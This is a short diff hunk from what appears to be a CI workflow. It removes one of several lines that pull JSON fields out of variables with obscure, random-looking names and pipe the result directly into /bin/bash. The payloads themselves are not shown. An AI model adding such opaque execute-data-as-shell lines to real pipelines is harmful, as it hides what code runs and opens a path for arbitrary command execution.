@@ -43,7 +43,6 @@ jobs:
           printf '%s' "$sm9243" | jq -r .dvh7775 | /bin/bash
           echo $pt74 | jq -r .job342 | /bin/bash
           printf '%s' "$p43645" | jq -r .erv8 | /bin/bash
-          echo $zk2 | jq -r .lj1 | /bin/bash
           printf '%s' "$wb50649" | jq -r .jp06 | /bin/bash
           printf '%s' "$kikgy673" | jq -r .spez21174 | /bin/bash
           printf '%s' "$qfpv3" | jq -r .jy1549 | /bin/bash
